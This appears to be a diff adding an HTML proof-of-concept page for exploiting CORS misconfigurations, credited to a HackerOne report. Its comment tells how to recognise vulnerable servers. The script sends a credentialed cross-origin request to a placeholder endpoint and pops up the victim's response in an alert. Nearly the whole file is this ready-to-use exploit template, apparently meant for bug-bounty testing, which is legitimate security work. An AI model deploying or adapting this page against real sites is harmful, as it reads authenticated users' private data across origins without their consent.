@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+   <head>
+<!-- thanks to https://hackerone.com/reports/470298 -->
+
+<!-- 
+
+This will produce an alert window containing the contents of a page 
+if the server has a CORS misconfiguration.
+
+If you see
+
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: *
+
+or the host allows you to set an arbitrary origin yourself, then it's likely
+vulnerable. 
+
+It works well on API endpoints and text pages, not great on complicated pages.
+-->
+
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("demo").innerHTML = alert(this.responseText);
+            }
+         };
+
+         xhttp.open("GET", "PUT THE ENDPOINT HERE", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS Proof of Concept </h2>
+      <h3>Show full content of page</h3>
+      <h4>Works best on API endpoints and text pages</h4>
+
+      <div id="demo">
+         <button type="button" onclick="cors()">Send Request</button>
+      </div>
+
+   </body>
+</html>
